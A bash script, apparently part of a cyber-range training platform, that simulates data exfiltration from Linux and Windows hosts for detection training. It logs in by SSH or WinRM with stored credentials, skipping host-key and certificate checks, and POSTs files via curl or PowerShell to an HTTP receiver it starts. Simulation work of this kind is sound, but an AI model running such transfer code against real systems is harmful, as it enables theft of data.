#!/usr/bin/env bash

set -u


# ============================================================
# Nordic Manufacturing A/S
# MrNobody Incident Platform
#
# Phase 06 - Exfiltration Simulation
#
# Linux:
#   SSH -> curl -> IncidentVM
#
# Windows:
#   WinRM -> PowerShell HTTP POST -> IncidentVM
#
# Transfers only registered synthetic staging data, or one fixed
# simulated file generated by standalone P06 itself.
# ============================================================

# ============================================================
# MRNOBODY ATTACK METADATA
# ============================================================

# ATTACK_ID="06"
# ATTACK_DESCRIPTION="Transfer synthetic staged training data to the configured incident receiver."
# ATTACK_TEACHING_PURPOSE="Correlate source files with outbound transfers and receiver evidence."
# ATTACK_DETECTION_FOCUS="Outbound connections|Synthetic file transfer|Receiver events"
# ATTACK_PLATFORMS="Linux|Windows"
# ATTACK_PREREQUISITES="Authenticated remote access; standalone creates one simulated file by default. Campaign uses incident-scoped P03/P05 state."
# ATTACK_TARGET_TYPE="Synthetic training files only"
# ATTACK_CLEANUP="Transfer evidence and receiver artifacts are retained; no automatic source-file restore is provided."
# ATTACK_NAME="Exfiltration"
# ATTACK_ALIAS="exfil"
# ATTACK_STANDALONE="true"
# ATTACK_PARAMETERS="target,port,protocol,username,password,file"
# ATTACK_CAMPAIGN_STATE="staged-data,compromised-hosts"

# MITRE_TACTIC="Exfiltration"
# MITRE_TECHNIQUES="T1041"
# MITRE_TECHNIQUE_NAMES="Exfiltration Over C2 Channel"

# ============================================================
# PATHS / CONFIG
# ============================================================

BASE_DIR="${NORDIC_BASE_DIR:-/opt/nordic-attack}"
CONFIG_FILE="$BASE_DIR/config/defaults.conf"

if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "[ERROR] Configuration file not found: $CONFIG_FILE"
    exit 1
fi

# shellcheck source=/dev/null
source "$CONFIG_FILE"

mkdir -p \
    "$NORDIC_LOG_DIR" \
    "$NORDIC_STATE_DIR" \
    "$NORDIC_UPLOAD_DIR"


# ============================================================
# CAMPAIGN CONFIGURATION
# ============================================================

INCIDENT_ID="${NORDIC_INCIDENT_ID:-MRN-$(date +%Y%m%d-%H%M%S)}"

SSH_PASSWORD="${NORDIC_SSH_PASSWORD:-$NORDIC_DEFAULT_SSH_PASSWORD}"

RDP_PASSWORD="${NORDIC_RDP_PASSWORD:-$NORDIC_DEFAULT_RDP_PASSWORD}"

# ============================================================
# EXECUTION MODE
# ============================================================

RUN_MODE="${MRNOBODY_RUN_MODE:-campaign}"
if [[ "$RUN_MODE" == campaign ]]; then
    unset MRNOBODY_STAGING_INCIDENT MRNOBODY_REQUIRE_STAGING
fi

MANUAL_TARGET="${MRNOBODY_TARGET:-}"
MANUAL_PORT="${MRNOBODY_PORT:-}"
MANUAL_PROTOCOL="${MRNOBODY_PROTOCOL:-}"
MANUAL_USERNAME="${MRNOBODY_USERNAME:-}"
MANUAL_PASSWORD="${MRNOBODY_PASSWORD:-}"
MANUAL_FILE="${MRNOBODY_FILE:-}"
WINRM_HTTP_PORT="${NORDIC_WINRM_HTTP_PORT:-${NORDIC_DEFAULT_WINRM_HTTP_PORT:-5985}}"
WINRM_HTTPS_PORT="${NORDIC_WINRM_HTTPS_PORT:-${NORDIC_DEFAULT_WINRM_HTTPS_PORT:-5986}}"

STAGING_STATE="${NORDIC_STAGING_STATE:-$NORDIC_STATE_DIR/staged-data.json}"
EXFIL_STATE="$NORDIC_STATE_DIR/exfiltration.json"
COMPROMISED_STATE="$NORDIC_COMPROMISED_STATE"

LOG_FILE="$NORDIC_LOG_DIR/${INCIDENT_ID}-06-exfil.log"
export NORDIC_P06_STARTED="$(date --iso-8601=seconds)"

EXFIL_PORT="${NORDIC_EXFIL_PORT:-9090}"


# ============================================================
# FUNCTIONS
# ============================================================

log() {

    local MESSAGE="$1"

    echo "$MESSAGE"

    printf '%s %s\n' \
        "$(date --iso-8601=seconds)" \
        "$MESSAGE" \
        >> "$LOG_FILE"
}


ground_truth() {

    local MESSAGE="$1"

    printf '%s INCIDENT=%s PHASE=06 %s\n' \
        "$(date --iso-8601=seconds)" \
        "$INCIDENT_ID" \
        "$MESSAGE" \
        >> "$NORDIC_GROUND_TRUTH_LOG"
}


verify_received() {
    python3 "$BASE_DIR/web/exfil_validation.py" --received \
        "$NORDIC_UPLOAD_DIR/${INCIDENT_ID}-$2-$1.bin" "$3|$4"
}

tcp_open() {
    local HOST="$1"
    local PORT="$2"
    local CONNECT_TIMEOUT="${NORDIC_CONNECT_TIMEOUT:-2}"

    timeout "$CONNECT_TIMEOUT" \
        bash -c "echo >/dev/tcp/$HOST/$PORT" \
        >/dev/null 2>&1
}


# ============================================================
# REQUIRED COMMANDS
# ============================================================

for CMD in python3 timeout ss; do

    if ! command -v "$CMD" >/dev/null 2>&1; then

        echo "[ERROR] Required command not found: $CMD"
        exit 1

    fi

done


# ============================================================
# WINDOWS WINRM SUPPORT
# ============================================================

PYTHON_BIN="$BASE_DIR/venv/bin/python"

PYWINRM_AVAILABLE=0

if "$PYTHON_BIN" -c "import winrm" >/dev/null 2>&1; then
    PYWINRM_AVAILABLE=1
fi


# ============================================================
# VALIDATION
# ============================================================

if [[ "$RUN_MODE" == "campaign" ]]; then

    if [[ ! -f "$STAGING_STATE" ]]; then

        echo "[ERROR] Missing staging inventory:"
        echo "$STAGING_STATE"
        echo
        echo "Run Phase 05 first."

        exit 1
    fi

    if [[ ! -f "$COMPROMISED_STATE" ]]; then

        echo "[ERROR] Missing compromised host inventory:"
        echo "$COMPROMISED_STATE"
        echo
        echo "Run Phase 03 first."

        exit 1
    fi

elif [[ "$RUN_MODE" == "standalone" ]]; then

    if [[ -z "$MANUAL_TARGET" ]]; then

        echo "[ERROR] Standalone mode requires --target"
        exit 1

    fi


else

    echo "[ERROR] Unknown run mode: $RUN_MODE"
    exit 1

fi

if ! [[ "$EXFIL_PORT" =~ ^[0-9]+$ ]] ||
   (( EXFIL_PORT < 1024 || EXFIL_PORT > 65535 )); then

    echo "[ERROR] Invalid exfiltration port:"
    echo "$EXFIL_PORT"

    exit 1
fi



# ============================================================
# DETERMINE INCIDENTVM IP
# ============================================================

if [[ "$RUN_MODE" == "campaign" ]]; then

    FIRST_TARGET="$(
        python3 - "$STAGING_STATE" <<'PY'
import json
import sys

with open(sys.argv[1], encoding="utf-8") as f:
    data = json.load(f)

hosts = data.get("hosts", [])

if hosts:
    print(hosts[0].get("ip", ""))
PY
    )"

else

    FIRST_TARGET="$MANUAL_TARGET"

fi


INCIDENT_IP="${NORDIC_INCIDENT_IP:-}"


if [[ -z "$INCIDENT_IP" ]] && [[ -n "$FIRST_TARGET" ]]; then

    INCIDENT_IP="$(
        ip -4 route get "$FIRST_TARGET" 2>/dev/null |
        awk '
        {
            for (i=1; i<=NF; i++) {
                if ($i == "src") {
                    print $(i+1)
                    exit
                }
            }
        }'
    )"

fi


if [[ -z "$INCIDENT_IP" ]]; then

    echo "[ERROR] Unable to determine IncidentVM IP."
    echo
    echo "Supply NORDIC_INCIDENT_IP through the campaign GUI."

    exit 1
fi


# ============================================================
# LOAD STAGED HOSTS
#
# Format:
#
# IP|PLATFORM|ACCESS|PORT|USER|PASSWORD|FILE|SIZE|HASH

# Old Linux-only staged-data.json is also supported.
# ============================================================


STAGED_HOSTS=()

if [[ "$RUN_MODE" == "campaign" ]]; then

    CAMPAIGN_RECORDS="$(
        python3 - "$STAGING_STATE" "$COMPROMISED_STATE" "$INCIDENT_ID" <<'PY'
import json
import sys

with open(sys.argv[1], encoding="utf-8") as f:
    data = json.load(f)

with open(sys.argv[2], encoding="utf-8") as f:
    compromised_data = json.load(f)

if data.get('incident_id') != sys.argv[3] or compromised_data.get('incident_id') != sys.argv[3]:
    raise SystemExit('P06 campaign inventory incident ID mismatch; run P03/P05 for this incident')

compromised_by_ip = {
    host.get("ip"): host
    for host in compromised_data.get("hosts", [])
    if host.get("ip")
}

for host in data.get("hosts", []):

    if not host.get("staged") or host.get("data_type") != "synthetic-training-data":
        continue

    ip = host.get("ip", "")

    if not ip:
        continue

    compromised = compromised_by_ip.get(ip, {})

    platform = host.get(
        "platform",
        ""
    ).lower()

    access = host.get(
        "access",
        ""
    ).lower()

    if not platform:
        platform = "linux"

    if platform == "linux":

        port = host.get(
            "ssh_port",
            22
        )

        user = (
            compromised.get("ssh_username")
            or compromised.get("ssh_user")
            or host.get("ssh_username")
            or host.get("ssh_user")
            or "ubuntu"
        )

        password = (
            compromised.get("ssh_password")
            or compromised.get("password")
            or ""
        )

        access = "ssh"

    elif platform == "windows":

        port = host.get(
            "winrm_port",
            5985
        )

        user = (
            compromised.get("rdp_username")
            or compromised.get("rdp_user")
            or host.get("rdp_username")
            or host.get("rdp_user")
            or "Administrator"
        )

        password = (
            compromised.get("rdp_password")
            or compromised.get("password")
            or ""
        )

        access = "winrm"

    else:
        continue

    print(
        "{}|{}|{}|{}|{}|{}|{}|{}|{}".format(
            ip,
            platform,
            access,
            port,
            user,
            password,
            host.get("file", ""),
            host.get("size", 0),
            host.get("sha256", ""),
        )
    )

PY

    )" || { ground_truth "PHASE_FAILED reason=invalid_campaign_staging"; exit 1; }
    if [[ -n "$CAMPAIGN_RECORDS" ]]; then
        mapfile -t STAGED_HOSTS <<< "$CAMPAIGN_RECORDS"
    fi

elif [[ "$RUN_MODE" == "standalone" ]]; then

    case "${MANUAL_PROTOCOL,,}" in

        ssh|"")
            PLATFORM="linux"
            ACCESS="ssh"
            ACCESS_PORT="${MANUAL_PORT:-22}"
            ACCESS_USER="${MANUAL_USERNAME:-ubuntu}"
            ;;

        winrm|winrm-http)
            PLATFORM="windows"
            ACCESS="winrm"
            ACCESS_PORT="${MANUAL_PORT:-5985}"
            ACCESS_USER="${MANUAL_USERNAME:-Administrator}"
            ;;

        winrm-https)
            PLATFORM="windows"
            ACCESS="winrm"
            ACCESS_PORT="${MANUAL_PORT:-5986}"
            ACCESS_USER="${MANUAL_USERNAME:-Administrator}"
            ;;

        *)
            echo "[ERROR] Unsupported standalone protocol: $MANUAL_PROTOCOL"
            exit 1
            ;;
    esac

    # Revalidate at execution time: state may have changed after API submission.
    # A custom scenario uses its current incident; GUI/CLI reuse names an origin explicitly.
    export MRNOBODY_PROTOCOL="${MANUAL_PROTOCOL:-ssh}"
    export MRNOBODY_PORT="$ACCESS_PORT"
    export MRNOBODY_USERNAME="$ACCESS_USER"
    export NORDIC_INCIDENT_ID="$INCIDENT_ID"
    if [[ -z "$MANUAL_FILE" && -z "${MRNOBODY_STAGING_INCIDENT:-}" && "${MRNOBODY_REQUIRE_STAGING:-0}" != 1 ]]; then
        PREP_PYTHON="$(command -v python3)"
        [[ "$PLATFORM" == windows ]] && PREP_PYTHON="$PYTHON_BIN"
        STAGED_EVIDENCE="$("$PREP_PYTHON" "$BASE_DIR/web/p06_synthetic.py" "$EXFIL_STATE")" || {
            ground_truth "PHASE_FAILED reason=synthetic_preparation_failed"
            exit 1
        }
        IFS='|' read -r STAGED_SIZE STAGED_HASH MANUAL_FILE <<< "$STAGED_EVIDENCE"
        ground_truth "EXFIL_SYNTHETIC_CREATED source=$MANUAL_TARGET file=$MANUAL_FILE size=$STAGED_SIZE sha256=$STAGED_HASH source_kind=synthetic-default"
    else
        STAGED_EVIDENCE="$(python3 "$BASE_DIR/web/exfil_validation.py" "$STAGING_STATE")" || {
            ground_truth "PHASE_FAILED reason=invalid_staging_selection"
            exit 1
        }
        IFS='|' read -r STAGED_SIZE STAGED_HASH <<< "$STAGED_EVIDENCE"
        ground_truth "EXFIL_STAGING_SELECTED staging_incident=${MRNOBODY_STAGING_INCIDENT:-$INCIDENT_ID} source=$MANUAL_TARGET file=$MANUAL_FILE"
    fi
    STAGED_HOSTS=(
        "${MANUAL_TARGET}|${PLATFORM}|${ACCESS}|${ACCESS_PORT}|${ACCESS_USER}|${MANUAL_PASSWORD}|${MANUAL_FILE}|${STAGED_SIZE}|${STAGED_HASH}"
    )

fi


# ============================================================
# BANNER
# ============================================================

echo
echo "============================================================"
echo " NORDIC MANUFACTURING"
echo " MrNobody Incident Platform"
echo " PHASE 06 - EXFILTRATION"
echo "============================================================"
echo

log "[*] Incident ID: $INCIDENT_ID"
log "[*] IncidentVM receiver: $INCIDENT_IP:$EXFIL_PORT"
log "[*] Staged hosts: ${#STAGED_HOSTS[@]}"

echo


# ============================================================
# NO STAGED HOSTS
# ============================================================

if [[ ${#STAGED_HOSTS[@]} -eq 0 ]]; then

    log "[*] No staged hosts available."

    python3 - "$EXFIL_STATE" "$INCIDENT_ID" <<'PY'
import json
import sys
from datetime import datetime, timezone

data = {
    "incident_id": sys.argv[2],
    "generated": datetime.now(
        timezone.utc
    ).isoformat(),
    "count": 0,
    "transfers": [],
}

with open(
    sys.argv[1],
    "w",
    encoding="utf-8"
) as f:

    json.dump(
        data,
        f,
        indent=2
    )
PY

    ground_truth \
        "PHASE_FAILED reason=no_incident_staging_artifacts transfers=0"

    exit 1
fi


# Keep credential-free attempted sources even when receiver startup/transfer fails.
SOURCE_EVIDENCE=()
for RECORD in "${STAGED_HOSTS[@]}"; do
    IFS='|' read -r H P A PT U PW F SZ HASH <<< "$RECORD"
    SOURCE_EVIDENCE+=("$H|$P|$F|$SZ|$HASH")
done
python3 - "$EXFIL_STATE" "$INCIDENT_ID" "$NORDIC_UPLOAD_DIR" "${SOURCE_EVIDENCE[@]}" <<'PY' || { ground_truth "PHASE_FAILED reason=evidence_write_failed"; exit 1; }
import json
import os
from pathlib import Path
import sys
try:
    state = json.loads(Path(sys.argv[1]).read_text())
except (OSError, ValueError):
    state = {}
attempts = state.get('attempts', []) if state.get('incident_id') == sys.argv[2] else []
for line in sys.argv[4:]:
    host, platform, source, size, digest = line.split('|')
    if any(a.get('source') == host and a.get('remote_file') == source for a in attempts):
        continue
    attempts.append(dict(incident_id=sys.argv[2], source_incident_id=os.environ.get('MRNOBODY_STAGING_INCIDENT') or sys.argv[2],
        source=host, platform=platform, remote_file=source, source_name=source.replace('\\', '/').rsplit('/', 1)[-1],
        source_kind='staged-synthetic', synthetic=True, expected_size=int(size), source_size=int(size), sha256=digest,
        started_at=os.environ.get('NORDIC_P06_STARTED'), result='not_transferred', successful=False, verified=False,
        local_destination=str(Path(sys.argv[3])/f'{sys.argv[2]}-{platform}-{host}.bin')))
Path(sys.argv[1]).write_text(json.dumps(dict(incident_id=sys.argv[2], count=0, transfers=[], attempts=attempts), indent=2))
PY
unset SOURCE_EVIDENCE RECORD H P A PT U PW F SZ HASH

# ============================================================
# CREATE TEMPORARY RECEIVER
# ============================================================

RECEIVER="$NORDIC_STATE_DIR/.exfil-receiver.py"


cat > "$RECEIVER" <<'PY'
import os
import sys

from http.server import (
    BaseHTTPRequestHandler,
    HTTPServer,
)


bind_ip = sys.argv[1]
port = int(sys.argv[2])
upload_dir = sys.argv[3]


os.makedirs(
    upload_dir,
    exist_ok=True
)


class Handler(BaseHTTPRequestHandler):

    def do_POST(self):

        length = int(
            self.headers.get(
                "Content-Length",
                "0"
            )
        )

        source = self.headers.get(
            "X-Nordic-Source",
            "unknown"
        )

        incident = self.headers.get(
            "X-Nordic-Incident",
            "unknown"
        )

        platform = self.headers.get(
            "X-Nordic-Platform",
            "unknown"
        )


        safe_source = "".join(
            c if c.isalnum() or c in ".-_" else "_"
            for c in source
        )

        safe_incident = "".join(
            c if c.isalnum() or c in ".-_" else "_"
            for c in incident
        )

        safe_platform = "".join(
            c if c.isalnum() or c in ".-_" else "_"
            for c in platform
        )


        filename = (
            f"{safe_incident}-"
            f"{safe_platform}-"
            f"{safe_source}.bin"
        )


        destination = os.path.join(
            upload_dir,
            filename
        )


        remaining = length


        with open(
            destination,
            "wb"
        ) as f:

            while remaining > 0:

                chunk = self.rfile.read(
                    min(
                        65536,
                        remaining
                    )
                )

                if not chunk:
                    break

                f.write(
                    chunk
                )

                remaining -= len(
                    chunk
                )


        received = (
            length - remaining
        )


        self.send_response(
            200
        )

        self.end_headers()


        self.wfile.write(
            (
                f"NORDIC_RECEIVED "
                f"{received}\n"
            ).encode()
        )


    def log_message(
        self,
        fmt,
        *args
    ):

        sys.stdout.write(
            "%s %s\n" %
            (
                self.address_string(),
                fmt % args
            )
        )

        sys.stdout.flush()


server = HTTPServer(
    (
        bind_ip,
        port
    ),
    Handler
)

server.serve_forever()

PY


# ============================================================
# START RECEIVER
# ============================================================

RECEIVER_LOG="$NORDIC_LOG_DIR/${INCIDENT_ID}-exfil-receiver.log"


python3 "$RECEIVER" \
    "$INCIDENT_IP" \
    "$EXFIL_PORT" \
    "$NORDIC_UPLOAD_DIR" \
    >> "$RECEIVER_LOG" 2>&1 &


RECEIVER_PID=$!


cleanup() {

    if kill -0 "$RECEIVER_PID" 2>/dev/null; then

        kill "$RECEIVER_PID" 2>/dev/null || true

        wait "$RECEIVER_PID" 2>/dev/null || true

    fi

    rm -f "$RECEIVER"
}


trap cleanup EXIT


sleep 1


RECEIVER_READY=0

for _ in {1..40}; do

    if ! kill -0 "$RECEIVER_PID" 2>/dev/null; then
        break
    fi

    if ss -lntH | awk '{print $4}' | grep -qE "(^|:)${EXFIL_PORT}$"; then
        RECEIVER_READY=1
        break
    fi

    sleep 0.25

done


if [[ $RECEIVER_READY -ne 1 ]]; then

    echo "[ERROR] Exfiltration receiver failed to become ready."
    echo
    echo "Receiver:"
    echo "  $INCIDENT_IP:$EXFIL_PORT"
    echo
    echo "Receiver log:"
    echo "  $RECEIVER_LOG"

    if [[ -s "$RECEIVER_LOG" ]]; then
        echo
        cat "$RECEIVER_LOG"
    fi

    exit 1
fi


log "[+] Exfiltration receiver ready on $INCIDENT_IP:$EXFIL_PORT."


# ============================================================
# EXFILTRATION
# ============================================================

TMP_RESULTS="$NORDIC_STATE_DIR/.exfil.tmp"

: > "$TMP_RESULTS"

SUCCESS_COUNT=0
FAILED_COUNT=0
SKIPPED_COUNT=0

LINUX_SUCCESS=0
WINDOWS_SUCCESS=0


for RECORD in "${STAGED_HOSTS[@]}"; do

    IFS='|' read -r \
        HOST \
        PLATFORM \
        ACCESS \
        ACCESS_PORT \
        ACCESS_USER \
        ACCESS_PASSWORD \
        REMOTE_FILE \
        EXPECTED_SIZE \
        EXPECTED_HASH \
        <<< "$RECORD"

    if [[ -z "$ACCESS_PASSWORD" ]]; then

        if [[ "$PLATFORM" == "linux" ]]; then
            [[ "$RUN_MODE" == "campaign" ]] && ACCESS_PASSWORD="$SSH_PASSWORD"

        elif [[ "$PLATFORM" == "windows" ]]; then
            [[ "$RUN_MODE" == "campaign" ]] && ACCESS_PASSWORD="$RDP_PASSWORD"
        fi

    fi

    echo
    echo "------------------------------------------------------------"
    echo " Source host: $HOST"
    echo " Platform:    $PLATFORM"
    echo "------------------------------------------------------------"
    echo


    if [[ "$RUN_MODE" == "standalone" ]]; then
        rm -f -- "$NORDIC_UPLOAD_DIR/${INCIDENT_ID}-${PLATFORM}-${HOST}.bin"
    fi
    log "[*] Starting simulated exfiltration from $HOST ($PLATFORM)"


    ground_truth \
        "EXFIL_START source=$HOST platform=$PLATFORM destination=$INCIDENT_IP:$EXFIL_PORT file=$REMOTE_FILE"


# ========================================================
# LINUX
# ========================================================

if [[ "$PLATFORM" == "linux" ]]; then

    if [[ -z "$ACCESS_PASSWORD" ]] || ! command -v sshpass >/dev/null || ! command -v ssh >/dev/null; then

        FAILED_COUNT=$(( FAILED_COUNT + 1 ))

        log "[WARNING] SSH credentials or dependencies unavailable for $HOST"

        ground_truth \
            "EXFIL_FAILED source=$HOST platform=linux reason=missing_credentials"

        continue
    fi


    REMOTE_RESULT="$(
        SSHPASS="$ACCESS_PASSWORD" sshpass -e \
            ssh \
                -p "$ACCESS_PORT" \
                -o StrictHostKeyChecking=no \
                -o UserKnownHostsFile=/dev/null \
                -o ConnectTimeout="$NORDIC_SSH_TIMEOUT" \
                -o PreferredAuthentications=password \
                -o PubkeyAuthentication=no \
                -o NumberOfPasswordPrompts=1 \
                "$ACCESS_USER@$HOST" \
                bash -s -- \
                    "$REMOTE_FILE" \
                    "$INCIDENT_IP" \
                    "$EXFIL_PORT" \
                    "$HOST" \
                    "$INCIDENT_ID" <<'REMOTE'

REMOTE_FILE="$1"
INCIDENT_IP="$2"
EXFIL_PORT="$3"
SOURCE_HOST="$4"
INCIDENT_ID="$5"


if [[ ! -f "$REMOTE_FILE" ]]; then

    echo "NORDIC_EXFIL_ERROR file-not-found"
    exit 1

fi


if ! command -v curl >/dev/null 2>&1; then

    echo "NORDIC_EXFIL_ERROR curl-not-found"
    exit 1

fi


RESPONSE="$(
    curl \
        -sS \
        --connect-timeout 5 \
        --max-time 30 \
        -X POST \
        -H "Content-Type: application/octet-stream" \
        -H "X-Nordic-Source: $SOURCE_HOST" \
        -H "X-Nordic-Incident: $INCIDENT_ID" \
        -H "X-Nordic-Platform: linux" \
        --data-binary "@$REMOTE_FILE" \
        "http://${INCIDENT_IP}:${EXFIL_PORT}/upload"
)"


RESULT=$?


if [[ $RESULT -ne 0 ]]; then

    echo "NORDIC_EXFIL_ERROR curl-failed"
    exit 1

fi


echo "$RESPONSE"

REMOTE
        )"


        COMMAND_RESULT=$?


        if [[ $COMMAND_RESULT -eq 0 ]] &&
           grep -q '^NORDIC_RECEIVED ' <<< "$REMOTE_RESULT" &&
           verify_received "$HOST" "linux" "$EXPECTED_SIZE" "$EXPECTED_HASH"; then


            RECEIVED_SIZE="$(
                printf '%s\n' "$REMOTE_RESULT" |
                awk '/^NORDIC_RECEIVED / {print $2}' |
                tail -n 1
            )"

            RECEIVED_SIZE="${RECEIVED_SIZE//$'\r'/}"

            SUCCESS_COUNT=$(( SUCCESS_COUNT + 1 ))
            LINUX_SUCCESS=$(( LINUX_SUCCESS + 1 ))


            log "[+] Exfiltration completed from $HOST"
            log "    Platform: Linux"
            log "    Destination: $INCIDENT_IP:$EXFIL_PORT"
            log "    Bytes: $RECEIVED_SIZE"


            printf '%s|%s|%s|%s|%s|%s|%s\n' \
                "$HOST" \
                "linux" \
                "$REMOTE_FILE" \
                "$INCIDENT_IP" \
                "$EXFIL_PORT" \
                "$RECEIVED_SIZE" \
                "$EXPECTED_HASH" \
                >> "$TMP_RESULTS"


            ground_truth \
                "EXFIL_SUCCESS source=$HOST platform=linux destination=$INCIDENT_IP:$EXFIL_PORT bytes=$RECEIVED_SIZE sha256=$EXPECTED_HASH file=$REMOTE_FILE verified=true"


        else

            FAILED_COUNT=$(( FAILED_COUNT + 1 ))

            log "[WARNING] Exfiltration failed from Linux host $HOST"

            ground_truth \
                "EXFIL_FAILED source=$HOST platform=linux destination=$INCIDENT_IP:$EXFIL_PORT"

        fi


    # ========================================================
    # WINDOWS
    # ========================================================

    elif [[ "$PLATFORM" == "windows" ]]; then


        if [[ -z "$ACCESS_PASSWORD" ]]; then

            FAILED_COUNT=$(( FAILED_COUNT + 1 ))

            log "[WARNING] Windows password unavailable for $HOST"

            ground_truth \
                "EXFIL_FAILED source=$HOST platform=windows reason=missing_credentials"

            continue
        fi


        if [[ $PYWINRM_AVAILABLE -ne 1 ]]; then

            SKIPPED_COUNT=$(( SKIPPED_COUNT + 1 ))

            log "[SKIPPED] Python pywinrm is not installed."

            ground_truth \
                "EXFIL_SKIPPED source=$HOST platform=windows reason=pywinrm_unavailable"

            continue
        fi


        # ----------------------------------------------------
        # Use the WinRM port saved by Phase 05 when possible.
        # Verify it is still reachable.
        # ----------------------------------------------------

        WINRM_PORT=""
        WINRM_SCHEME=""


        if [[ "$RUN_MODE" == "standalone" ]]; then
            if ! tcp_open "$HOST" "$ACCESS_PORT"; then
                FAILED_COUNT=$(( FAILED_COUNT + 1 ))
                log "[ERROR] Selected WinRM transport unavailable on $HOST:$ACCESS_PORT"
                ground_truth "EXFIL_FAILED source=$HOST platform=windows reason=selected_transport_unavailable"
                continue
            fi
            WINRM_PORT="$ACCESS_PORT"
            WINRM_SCHEME="http"
            [[ "$MANUAL_PROTOCOL" == "winrm-https" ]] && WINRM_SCHEME="https"
        elif [[ "$ACCESS_PORT" == "$WINRM_HTTPS_PORT" ]] &&
           tcp_open "$HOST" "$ACCESS_PORT"; then

            WINRM_PORT="$ACCESS_PORT"
            WINRM_SCHEME="https"


        elif [[ "$ACCESS_PORT" == "$WINRM_HTTP_PORT" ]] &&
             tcp_open "$HOST" "$ACCESS_PORT"; then

            WINRM_PORT="$ACCESS_PORT"
            WINRM_SCHEME="http"


        elif [[ "$RUN_MODE" == "campaign" ]] && tcp_open "$HOST" "$WINRM_HTTP_PORT"; then

            WINRM_PORT="$WINRM_HTTP_PORT"
            WINRM_SCHEME="http"


        elif [[ "$RUN_MODE" == "campaign" ]] && tcp_open "$HOST" "$WINRM_HTTPS_PORT"; then

            WINRM_PORT="$WINRM_HTTPS_PORT"
            WINRM_SCHEME="https"


        elif [[ "$RUN_MODE" == "standalone" ]]; then
            FAILED_COUNT=$(( FAILED_COUNT + 1 ))
            log "[ERROR] Selected WinRM transport unavailable on $HOST:$ACCESS_PORT"
            ground_truth "EXFIL_FAILED source=$HOST platform=windows reason=selected_transport_unavailable"
            continue
        else

            SKIPPED_COUNT=$(( SKIPPED_COUNT + 1 ))

            log "[SKIPPED] No reachable WinRM service on $HOST"

            ground_truth \
                "EXFIL_SKIPPED source=$HOST platform=windows reason=winrm_unavailable"

            continue
        fi


        # ----------------------------------------------------
        # Execute the POST FROM the Windows host.
        #
        # PowerShell reads only REMOTE_FILE, which is the
        # synthetic file recorded by Phase 05.
        # ----------------------------------------------------

        WINDOWS_RESULT="$(
            NORDIC_WINRM_PASSWORD="$ACCESS_PASSWORD" \
            "$PYTHON_BIN" - \
                "$HOST" \
                "$WINRM_PORT" \
                "$WINRM_SCHEME" \
                "$ACCESS_USER" \
                "$REMOTE_FILE" \
                "$INCIDENT_IP" \
                "$EXFIL_PORT" \
                "$INCIDENT_ID" <<'PY'

import os
import sys

import winrm


host = sys.argv[1]
port = int(sys.argv[2])
scheme = sys.argv[3]
username = sys.argv[4]
remote_file = sys.argv[5]
incident_ip = sys.argv[6]
exfil_port = int(sys.argv[7])
incident_id = sys.argv[8]

password = os.environ[
    "NORDIC_WINRM_PASSWORD"
]


endpoint = (
    f"{scheme}://"
    f"{host}:"
    f"{port}/wsman"
)


session = winrm.Session(
    endpoint,
    auth=(
        username,
        password
    ),
    transport="ntlm",
    server_cert_validation="ignore",
)


def ps_quote(value):
    return value.replace(
        "'",
        "''"
    )


remote_file_ps = ps_quote(
    remote_file
)

incident_ip_ps = ps_quote(
    incident_ip
)

incident_id_ps = ps_quote(
    incident_id
)

host_ps = ps_quote(
    host
)


powershell = rf'''
$ErrorActionPreference = "Stop"

$RemoteFile = '{remote_file_ps}'
$IncidentIP = '{incident_ip_ps}'
$ExfilPort = {exfil_port}
$SourceHost = '{host_ps}'
$IncidentId = '{incident_id_ps}'


if (-not (
    Test-Path `
        -LiteralPath $RemoteFile `
        -PathType Leaf
)) {{

    Write-Output "NORDIC_EXFIL_ERROR file-not-found"
    exit 1

}}


$Uri = (
    "http://" +
    $IncidentIP +
    ":" +
    $ExfilPort +
    "/upload"
)


$Headers = @{{
    "X-Nordic-Source" = $SourceHost
    "X-Nordic-Incident" = $IncidentId
    "X-Nordic-Platform" = "windows"
}}


try {{

    $Bytes = [System.IO.File]::ReadAllBytes(
        $RemoteFile
    )


    $Response = Invoke-WebRequest `
        -Uri $Uri `
        -Method Post `
        -Headers $Headers `
        -ContentType "application/octet-stream" `
        -Body $Bytes `
        -UseBasicParsing `
        -TimeoutSec 30


    if ($Response.Content -is [byte[]]) {{

    $ResponseText = [System.Text.Encoding]::UTF8.GetString(
        $Response.Content
        )

    }}
    else {{

        $ResponseText = [string]$Response.Content

    }}

    Write-Output $ResponseText.Trim()

}}
catch {{

    Write-Output "NORDIC_EXFIL_ERROR http-post-failed"
    Write-Error $_
    exit 1

}}
'''


result = session.run_ps(
    powershell
)


stdout = result.std_out.decode(
    "utf-8",
    errors="replace"
)

stderr = result.std_err.decode(
    "utf-8",
    errors="replace"
)


if stdout:
    print(
        stdout,
        end=""
    )


if stderr:
    print(
        stderr,
        file=sys.stderr,
        end=""
    )


sys.exit(
    0 if result.status_code == 0 else 1
)

PY
        )"


        COMMAND_RESULT=$?


        if [[ $COMMAND_RESULT -eq 0 ]] &&
           grep -q '^NORDIC_RECEIVED ' <<< "$WINDOWS_RESULT" &&
           verify_received "$HOST" "windows" "$EXPECTED_SIZE" "$EXPECTED_HASH"; then


            RECEIVED_SIZE="$(
                printf '%s\n' "$WINDOWS_RESULT" |
                awk '/^NORDIC_RECEIVED / {print $2}' |
                tail -n 1
            )"

            RECEIVED_SIZE="${RECEIVED_SIZE//$'\r'/}"

            SUCCESS_COUNT=$(( SUCCESS_COUNT + 1 ))
            WINDOWS_SUCCESS=$(( WINDOWS_SUCCESS + 1 ))


            log "[+] Exfiltration completed from $HOST"
            log "    Platform: Windows"
            log "    Destination: $INCIDENT_IP:$EXFIL_PORT"
            log "    Bytes: $RECEIVED_SIZE"


            printf '%s|%s|%s|%s|%s|%s|%s\n' \
                "$HOST" \
                "windows" \
                "$REMOTE_FILE" \
                "$INCIDENT_IP" \
                "$EXFIL_PORT" \
                "$RECEIVED_SIZE" \
                "$EXPECTED_HASH" \
                >> "$TMP_RESULTS"


            ground_truth \
                "EXFIL_SUCCESS source=$HOST platform=windows destination=$INCIDENT_IP:$EXFIL_PORT bytes=$RECEIVED_SIZE sha256=$EXPECTED_HASH file=$REMOTE_FILE verified=true"


        else

            FAILED_COUNT=$(( FAILED_COUNT + 1 ))

            log "[WARNING] Exfiltration failed from Windows host $HOST"

            ground_truth \
                "EXFIL_FAILED source=$HOST platform=windows destination=$INCIDENT_IP:$EXFIL_PORT"

        fi


    # ========================================================
    # UNKNOWN PLATFORM
    # ========================================================

    else

        SKIPPED_COUNT=$(( SKIPPED_COUNT + 1 ))

